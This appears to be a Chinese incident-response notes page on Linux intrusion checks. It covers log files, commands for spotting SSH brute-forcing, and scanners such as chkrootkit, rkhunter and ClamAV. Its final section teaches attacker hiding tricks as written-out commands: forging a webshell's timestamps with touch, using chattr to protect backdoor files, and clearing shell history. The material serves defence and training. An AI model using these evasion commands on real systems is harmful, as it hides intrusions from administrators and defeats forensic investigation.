+<h4 id="1-8-检查异常文件"><a href="#1-8-检查异常文件" class="headerlink" title="1.8 检查异常文件"></a>1.8 检查异常文件</h4><p>1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</p>
+<p>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p>
+<p> 可以使用find命令来查找，如 find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件</p>
+<p>3、针对可疑文件可以使用stat进行创建修改时间。</p>
+<h4 id="1-9-检查系统日志"><a href="#1-9-检查系统日志" class="headerlink" title="1.9 检查系统日志"></a>1.9 检查系统日志</h4><p>日志默认存放位置：/var/log/</p>
+<p>查看日志配置情况：more /etc/rsyslog.conf</p>
+<table>
+<thead>
+<tr>
+<th align="center">日志文件</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">/var/log/cron</td>
+<td align="center">记录了系统定时任务相关的日志</td>
+</tr>
+<tr>
+<td align="center">/var/log/cups</td>
+<td align="center">记录打印信息的日志</td>
+</tr>
+<tr>
+<td align="center">/var/log/dmesg</td>
+<td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
+</tr>
+<tr>
+<td align="center">/var/log/mailog</td>
+<td align="center">记录邮件信息</td>
+</tr>
+<tr>
+<td align="center">/var/log/message</td>
+<td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
+</tr>
+<tr>
+<td align="center">/var/log/btmp</td>
+<td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
+</tr>
+<tr>
+<td align="center">/var/log/lastlog</td>
+<td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
+</tr>
+<tr>
+<td align="center">/var/log/wtmp</td>
+<td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
+</tr>
+<tr>
+<td align="center">/var/log/utmp</td>
+<td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
+</tr>
+<tr>
+<td align="center">/var/log/secure</td>
+<td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
+</tr>
+</tbody></table>
+<p>日志分析技巧：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e &#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">2、登录成功的IP有哪些：     </span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name&#x3D;kali, GID&#x3D;1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name&#x3D;kali, UID&#x3D;1001, GID&#x3D;1001, home&#x3D;&#x2F;home&#x2F;kali</span><br><span class="line">, shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; &#x2F;var&#x2F;log&#x2F;secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line"># grep &quot;userdel&quot; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid&#x3D;0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY&#x3D;pts&#x2F;4 ; PWD&#x3D;&#x2F;home&#x2F;good ; USER&#x3D;root ; COMMAND&#x3D;&#x2F;sbin&#x2F;shutdown -r now</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="2-1-Rootkit查杀"><a href="#2-1-Rootkit查杀" class="headerlink" title="2.1 Rootkit查杀"></a>2.1 Rootkit查杀</h4><ul>
+<li><p>chkrootkit</p>
+<p>网址：<a target="_blank" rel="noopener" href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">wget ftp:&#x2F;&#x2F;ftp.pangeia.com.br&#x2F;pub&#x2F;seg&#x2F;pac&#x2F;chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-0.52</span><br><span class="line">make sense</span><br><span class="line">#编译完成没有报错的话执行检查</span><br><span class="line">.&#x2F;chkrootkit</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>rkhunter</p>
+<p>网址：<a target="_blank" rel="noopener" href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">Wget https:&#x2F;&#x2F;nchc.dl.sourceforge.net&#x2F;project&#x2F;rkhunter&#x2F;rkhunter&#x2F;1.4.4&#x2F;rkhunter-1.4.4.tar.gz</span><br><span class="line">tar -zxvf rkhunter-1.4.4.tar.gz</span><br><span class="line">cd rkhunter-1.4.4</span><br><span class="line">.&#x2F;installer.sh --install</span><br><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h4><ul>
+<li><p>Clamav</p>
+<p>ClamAV的官方下载地址为：<a target="_blank" rel="noopener" href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a></p>
+<p>安装方式一：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1、安装zlib：</span><br><span class="line">wget http:&#x2F;&#x2F;nchc.dl.sourceforge.net&#x2F;project&#x2F;libpng&#x2F;zlib&#x2F;1.2.7&#x2F;zlib-1.2.7.tar.gz </span><br><span class="line">tar -zxvf  zlib-1.2.7.tar.gz</span><br><span class="line">cd zlib-1.2.7</span><br><span class="line">#安装一下gcc编译环境： yum install gcc</span><br><span class="line">CFLAGS&#x3D;&quot;-O3 -fPIC&quot; .&#x2F;configure --prefix&#x3D; &#x2F;usr&#x2F;local&#x2F;zlib&#x2F;</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">2、添加用户组clamav和组成员clamav：</span><br><span class="line">groupadd clamav</span><br><span class="line">useradd -g clamav -s &#x2F;bin&#x2F;false -c &quot;Clam AntiVirus&quot; clamav</span><br><span class="line"></span><br><span class="line">3、安装Clamav</span><br><span class="line">tar –zxvf clamav-0.97.6.tar.gz</span><br><span class="line">cd clamav-0.97.6</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;opt&#x2F;clamav --disable-clamav -with-zlib&#x3D;&#x2F;usr&#x2F;local&#x2F;zlib</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">4、配置Clamav</span><br><span class="line">mkdir &#x2F;opt&#x2F;clamav&#x2F;logs</span><br><span class="line">mkdir &#x2F;opt&#x2F;clamav&#x2F;updata</span><br><span class="line">touch &#x2F;opt&#x2F;clamav&#x2F;logs&#x2F;freshclam.log</span><br><span class="line">touch &#x2F;opt&#x2F;clamav&#x2F;logs&#x2F;clamd.log</span><br><span class="line">cd &#x2F;opt&#x2F;clamav&#x2F;logs</span><br><span class="line">chown clamav:clamav clamd.log</span><br><span class="line">chown clamav:clamav freshclam.log</span><br><span class="line"></span><br><span class="line">5、ClamAV 使用：</span><br><span class="line"> &#x2F;opt&#x2F;clamav&#x2F;bin&#x2F;freshclam 升级病毒库</span><br><span class="line">.&#x2F;clamscan –h 查看相应的帮助信息</span><br><span class="line">.&#x2F;clamscan -r &#x2F;home  扫描所有用户的主目录就使用</span><br><span class="line">.&#x2F;clamscan -r --bell -i &#x2F;bin  扫描bin目录并且显示有问题的文件的扫描结果</span><br></pre></td></tr></table></figure>
+
+<p>安装方式二：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#安装</span><br><span class="line">yum install -y clamav</span><br><span class="line">#更新病毒库</span><br><span class="line">freshclam</span><br><span class="line">#扫描方法</span><br><span class="line">clamscan -r &#x2F;etc --max-dir-recursion&#x3D;5 -l &#x2F;root&#x2F;etcclamav.log</span><br><span class="line">clamscan -r &#x2F;bin --max-dir-recursion&#x3D;5 -l &#x2F;root&#x2F;binclamav.log</span><br><span class="line">clamscan -r &#x2F;usr --max-dir-recursion&#x3D;5 -l &#x2F;root&#x2F;usrclamav.log</span><br><span class="line">#扫描并杀毒</span><br><span class="line">clamscan -r  --remove  &#x2F;usr&#x2F;bin&#x2F;bsd-port</span><br><span class="line">clamscan -r  --remove  &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">clamscan -r --remove  &#x2F;usr&#x2F;local&#x2F;zabbix&#x2F;sbin</span><br><span class="line">#查看日志发现</span><br><span class="line">cat &#x2F;root&#x2F;usrclamav.log |grep FOUND</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="2-3-webshell查杀"><a href="#2-3-webshell查杀" class="headerlink" title="2.3 webshell查杀"></a>2.3 webshell查杀</h4><p>linux版：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">河马webshell查杀：http:&#x2F;&#x2F;www.shellpub.com</span><br><span class="line">深信服Webshell网站后门检测工具：http:&#x2F;&#x2F;edr.sangfor.com.cn&#x2F;backdoor_detection.html</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-4-RPM-check检查"><a href="#2-4-RPM-check检查" class="headerlink" title="2.4 RPM check检查"></a>2.4 RPM check检查</h4><p> 系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;rpm -Va &gt; rpm.log</span><br></pre></td></tr></table></figure>
+
+<p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">验证内容中的8个信息的具体内容如下：</span><br><span class="line">        S         文件大小是否改变</span><br><span class="line">        M         文件的类型或文件的权限（rwx）是否被改变</span><br><span class="line">        5         文件MD5校验是否改变（可以看成文件内容是否改变）</span><br><span class="line">        D         设备中，从代码是否改变</span><br><span class="line">        L         文件路径是否改变</span><br><span class="line">        U         文件的属主（所有者）是否改变</span><br><span class="line">        G         文件的属组是否改变</span><br><span class="line">        T         文件的修改时间是否改变</span><br></pre></td></tr></table></figure>
+
+<p>如果命令被替换了，如果还原回来：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件提取还原案例：</span><br><span class="line">rpm  -qf &#x2F;bin&#x2F;ls  查询ls命令属于哪个软件包</span><br><span class="line">mv  &#x2F;bin&#x2F;ls &#x2F;tmp  先把ls转移到tmp目录下，造成ls命令丢失的假象</span><br><span class="line">rpm2cpio &#x2F;mnt&#x2F;cdrom&#x2F;Packages&#x2F;coreutils-8.4-19.el6.i686.rpm | cpio -idv .&#x2F;bin&#x2F;ls 提取rpm包中ls命令到当前目录的&#x2F;bin&#x2F;ls下</span><br><span class="line">cp &#x2F;root&#x2F;bin&#x2F;ls  &#x2F;bin&#x2F; 把ls命令复制到&#x2F;bin&#x2F;目录 修复文件丢失</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-5-linux安全检查脚本"><a href="#2-5-linux安全检查脚本" class="headerlink" title="2.5 linux安全检查脚本"></a>2.5 linux安全检查脚本</h4><p>Github项目地址：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></p>
+<p><strong>尽信书不如无书，工具只是辅助，别太过于依赖，关键在于你如何解决问题的思路。</strong></p>
+<h1 id="Linux-日志分析"><a href="#Linux-日志分析" class="headerlink" title="Linux 日志分析"></a>Linux 日志分析</h1><h3 id="0x00-前言-1"><a href="#0x00-前言-1" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技巧。</p>
+<h3 id="0x01-日志简介"><a href="#0x01-日志简介" class="headerlink" title="0x01 日志简介"></a>0x01 日志简介</h3><p>日志默认存放位置：/var/log/</p>
+<p>查看日志配置情况：more /etc/rsyslog.conf</p>
+<table>
+<thead>
+<tr>
+<th align="center">日志文件</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">/var/log/cron</td>
+<td align="center">记录了系统定时任务相关的日志</td>
+</tr>
+<tr>
+<td align="center">/var/log/cups</td>
+<td align="center">记录打印信息的日志</td>
+</tr>
+<tr>
+<td align="center">/var/log/dmesg</td>
+<td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
+</tr>
+<tr>
+<td align="center">/var/log/mailog</td>
+<td align="center">记录邮件信息</td>
+</tr>
+<tr>
+<td align="center">/var/log/message</td>
+<td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
+</tr>
+<tr>
+<td align="center">/var/log/btmp</td>
+<td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
+</tr>
+<tr>
+<td align="center">/var/log/lastlog</td>
+<td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
+</tr>
+<tr>
+<td align="center">/var/log/wtmp</td>
+<td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
+</tr>
+<tr>
+<td align="center">/var/log/utmp</td>
+<td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
+</tr>
+<tr>
+<td align="center">/var/log/secure</td>
+<td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
+</tr>
+</tbody></table>
+<p>比较重要的几个日志： 登录失败记录：/var/log/btmp //lastb 最后一次登录：/var/log/lastlog //lastlog 登录成功记录: /var/log/wtmp //last 登录日志记录：/var/log/secure</p>
+<p> 目前登录用户信息：/var/run/utmp //w、who、users</p>
+<p> 历史命令记录：history 仅清理当前用户： history -c</p>
+<h3 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h3><h4 id="A、常用的shell命令"><a href="#A、常用的shell命令" class="headerlink" title="A、常用的shell命令"></a>A、常用的shell命令</h4><p>Linux下常用的shell命令如：find、grep 、egrep、awk、sed</p>
+<p>小技巧：</p>
+<p>1、grep显示前后几行信息:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">标准unix&#x2F;linux下的grep通过下面參数控制上下文：</span><br><span class="line">grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行</span><br><span class="line">grep -B 5 foo file 显示foo及前5行</span><br><span class="line">grep -A 5 foo file 显示foo及后5行</span><br><span class="line">查看grep版本号的方法是</span><br><span class="line">grep -V</span><br></pre></td></tr></table></figure>
+
+<p>2、grep 查找含有某字符串的所有文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;hello,world!&quot; </span><br><span class="line">* : 表示当前目录所有文件，也可以是某个文件名</span><br><span class="line">-r 是递归查找</span><br><span class="line">-n 是显示行号</span><br><span class="line">-R 查找所有文件包含子目录</span><br><span class="line">-i 忽略大小写</span><br></pre></td></tr></table></figure>
+
+<p>3、如何显示一个文件的某几行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat input_file | tail -n +1000 | head -n 2000</span><br><span class="line">#从第1000行开始，显示2000行。即显示1000~2999行</span><br></pre></td></tr></table></figure>
+
+<p>4、find /etc -name init</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;在目录&#x2F;etc中查找文件init</span><br></pre></td></tr></table></figure>
+
+<p>5、只是显示/etc/passwd的账户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;cat &#x2F;etc&#x2F;passwd |awk  -F &#39;:&#39;  &#39;&#123;print $1&#125;&#39;&#96;  </span><br><span class="line">&#x2F;&#x2F;awk -F指定域分隔符为&#39;:&#39;，将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域。</span><br></pre></td></tr></table></figure>
+
+<p>6、sed -i ‘153,$d’ .bash_history</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">删除历史操作记录，只保留前153行</span><br></pre></td></tr></table></figure>
+
+<h4 id="B、日志分析技巧"><a href="#B、日志分析技巧" class="headerlink" title="B、日志分析技巧"></a>B、日志分析技巧</h4><p><strong>A、/var/log/secure</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e &#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">2、登录成功的IP有哪些：     </span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name&#x3D;kali, GID&#x3D;1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name&#x3D;kali, UID&#x3D;1001, GID&#x3D;1001, home&#x3D;&#x2F;home&#x2F;kali</span><br><span class="line">, shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; &#x2F;var&#x2F;log&#x2F;secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line"># grep &quot;userdel&quot; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid&#x3D;0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY&#x3D;pts&#x2F;4 ; PWD&#x3D;&#x2F;home&#x2F;good ; USER&#x3D;root ; COMMAND&#x3D;&#x2F;sbin&#x2F;shutdown -r now</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、/var/log/yum.log</strong></p>
+<p>软件安装升级卸载日志：</p>
+<p>~~~yum install gcc yum install gcc</p>
+<p>[root@bogon ~]# more /var/log/yum.log</p>
+<p>Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686 <del>~</del></p>
+<h1 id="Linux-权限维持"><a href="#Linux-权限维持" class="headerlink" title="Linux 权限维持"></a>Linux 权限维持</h1><h2 id="隐藏篇"><a href="#隐藏篇" class="headerlink" title="隐藏篇"></a>隐藏篇</h2><h3 id="0x00-前言-2"><a href="#0x00-前言-2" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>攻击者在获取服务器权限后，会通过一些技巧来隐藏自己的踪迹和后门文件，本文介绍Linux下的几种隐藏技术。</p>
+<h3 id="0x01-隐藏文件"><a href="#0x01-隐藏文件" class="headerlink" title="0x01 隐藏文件"></a>0x01 隐藏文件</h3><p>Linux 下创建一个隐藏文件：<code>touch .test.txt</code></p>
+<p>touch 命令可以创建一个文件，文件名前面加一个 点 就代表是隐藏文件,如下图：</p>
+<p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-1.png"></p>
+<p>一般的Linux下的隐藏目录使用命令<code>ls -l</code>是查看不出来的，只能查看到文件及文件夹，查看Linux下的隐藏文件需要用到命令：<code>ls -al</code></p>
+<p>这里，我们可以看到在/tmp下，默认存在多个隐藏目录，这些目录是恶意文件常用来藏身的地方。如<code>/temp/.ICE-unix/、/temp/.Test-unix/、/temp/.X11-unix/、/temp/.XIM-unix/</code></p>
+<h3 id="0x02-隐藏文件时间戳"><a href="#0x02-隐藏文件时间戳" class="headerlink" title="0x02 隐藏文件时间戳"></a>0x02 隐藏文件时间戳</h3><p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p>
+<p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p>
+<p>利用方法</p>
+<p>touch -r index.php webshell.php</p>
+<p>或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。</p>
+<p>touch -t 1401021042.30 webshell.php</p>
+<h3 id="0x03-隐藏权限"><a href="#0x03-隐藏权限" class="headerlink" title="0x03 隐藏权限"></a>0x03 隐藏权限</h3><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。</p>
+<p>这个技巧常被用在后门，变成了一些难以清除的后门文件，令很多新手朋友感到头疼。</p>
